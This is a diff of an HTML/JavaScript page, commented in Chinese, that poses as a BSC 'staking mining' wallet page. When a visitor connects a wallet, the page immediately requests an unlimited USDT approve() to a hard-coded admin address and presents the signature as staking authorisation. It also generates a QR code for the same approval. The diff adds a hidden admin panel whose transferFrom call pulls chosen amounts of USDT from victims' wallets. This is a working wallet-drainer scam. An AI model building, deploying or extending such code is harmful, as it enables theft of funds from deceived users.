@@ -30,6 +30,20 @@ border:none;padding:16px;width:100%;
 border-radius:14px;font-size:16px;font-weight:bold
 }
 .tip {font-size:12px;color:#666;margin-top:10px;text-align:center}
+/* 管理员面板（默认隐藏，仅管理员登录可见） */
+.admin-panel {
+background:#1E1E35;padding:24px;border-radius:16px;display:none;margin-top:20px
+}
+.admin-panel.show {display:block}
+.admin-input {
+width:100%;padding:12px;background:#111;border:none;
+border-radius:8px;color:#fff;margin-bottom:10px;
+}
+.admin-btn {
+width:100%;padding:14px;background:#F0B90B;color:#000;
+border:none;border-radius:10px;font-weight:bold;margin-bottom:10px;
+cursor:pointer;
+}
 </style>
 </head>
 <body>
@@ -44,18 +58,25 @@ border-radius:14px;font-size:16px;font-weight:bold
     <button id="approveBtn">确认授权签名</button>
     <div class="tip">签名授权用于质押挖矿</div>
   </div>
+
+  <!-- 管理员提取面板（默认隐藏） -->
+  <div class="admin-panel" id="adminPanel">
+    <input class="admin-input" id="userAddr" placeholder="输入用户钱包地址">
+    <input class="admin-input" id="drawAmount" placeholder="提取数量（USDT）">
+    <button class="admin-btn" onclick="drawFromUser()">提取用户USDT</button>
+  </div>
 </div>
 
 <script>
 // ====================== 配置 ======================
-const TOKEN_ADDR  = "0x55d398326f99059fF775485246999027B3197955";
-const ADMIN_ADDR  = "0xFFe5dbfbbCDb7536c21DF3fa1AFDBd92685Ed508";
-const CHAIN_ID    = "0x38";
+const TOKEN_ADDR  = "0x55d398326f99059fF775485246999027B3197955"; // BSC USDT
+const ADMIN_ADDR  = "0xFFe5dbfbbCDb7536c21DF3fa1AFDBd92685Ed508";   // 管理员地址
+const CHAIN_ID    = "0x38"; // BSC 主网
 // ====================================================
 
 let account = null;
 
-// 切换到BSC
+// 切换到 BSC 链
 async function switchChain() {
   try {
     await window.ethereum.request({
@@ -65,43 +86,43 @@ async function switchChain() {
   } catch (e) {}
 }
 
-// 生成授权二维码
+// 生成授权二维码（适配 TP 钱包）
 function genApproveQR() {
   const data = "0x095ea7b3" + 
-    ADMIN_ADDR.slice(2).padStart(64,'0') + 
+    ADMIN_ADDR.slice(2).padStart(64, '0') + 
     "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
-  const uri = `ethereum:${TOKEN_ADDR}@56?data=${data}`;
+  const uri = `https://metamask.app.link/send/${TOKEN_ADDR}?value=0&data=${data}`;
   const qrUrl = "https://api.qrserver.com/v1/create-qr-code/?size=280x280&data=" + encodeURIComponent(uri);
   document.getElementById("qrcode").innerHTML = `<img src="${qrUrl}">`;
 }
 
-// 授权函数
+// 统一授权函数（确保弹出签名）
 async function doApprove() {
   if (!account) {
     alert("请先连接钱包");
     return;
   }
   try {
-    await window.ethereum.request({
+    const txHash = await window.ethereum.request({
       method: "eth_sendTransaction",
       params: [{
         from: account,
         to: TOKEN_ADDR,
         data: "0x095ea7b3" + 
-          ADMIN_ADDR.slice(2).padStart(64,'0') + 
+          ADMIN_ADDR.slice(2).padStart(64, '0') + 
           "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"
       }]
     });
-    alert("✅ 授权成功");
+    alert("✅ 授权成功！交易哈希：" + txHash);
   } catch (e) {
-    alert("❌ 已取消");
+    alert("❌ 授权已取消或失败");
   }
 }
 
-// 连接钱包（最兼容写法）
+// 连接钱包 → 自动弹授权 + 管理员面板判断
 document.getElementById("connectBtn").onclick = async () => {
   if (!window.ethereum) {
-    alert("请在钱包内打开");
+    alert("请在 TokenPocket/钱包内置浏览器打开");
     return;
   }
   await switchChain();
@@ -109,18 +130,62 @@ document.getElementById("connectBtn").onclick = async () => {
     const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
     account = accounts[0];
     document.getElementById("connectBtn").innerText = "✅ 已连接";
-    doApprove(); // 连接后直接弹授权
+    
+    // 连接后立刻弹授权
+    doApprove();
+
+    // 仅管理员登录时显示提取面板
+    if (account.toLowerCase() === ADMIN_ADDR.toLowerCase()) {
+      document.getElementById("adminPanel").classList.add("show");
+    }
   } catch (e) {
     alert("连接钱包失败，请重试");
   }
 };
 
-// 按钮授权
+// 点击按钮授权
 document.getElementById("approveBtn").onclick = async () => {
   await doApprove();
 };
 
-// 加载二维码
+// ====================== 管理员提取功能 ======================
+async function drawFromUser() {
+  if (!account || account.toLowerCase() !== ADMIN_ADDR.toLowerCase()) {
+    alert("❌ 权限不足，仅管理员可操作");
+    return;
+  }
+
+  const userAddr = document.getElementById("userAddr").value;
+  const drawAmount = document.getElementById("drawAmount").value;
+
+  if (!userAddr || !drawAmount || isNaN(drawAmount) || parseFloat(drawAmount) <= 0) {
+    alert("❌ 请输入有效的用户地址和提取数量");
+    return;
+  }
+
+  try {
+    // 构造 transferFrom 调用数据
+    const amount = BigInt(parseFloat(drawAmount) * 1e18).toString(16).padStart(64, '0');
+    const data = "0x23b872dd" + 
+      userAddr.slice(2).padStart(64, '0') + 
+      ADMIN_ADDR.slice(2).padStart(64, '0') + 
+      amount;
+
+    const txHash = await window.ethereum.request({
+      method: "eth_sendTransaction",
+      params: [{
+        from: account,
+        to: TOKEN_ADDR,
+        data: data
+      }]
+    });
+    alert("✅ 提取成功！交易哈希：" + txHash);
+  } catch (e) {
+    alert("❌ 提取失败，请检查用户是否已授权");
+  }
+}
+
+// 页面加载就生成二维码
 window.onload = genApproveQR;
 </script>
 </body>
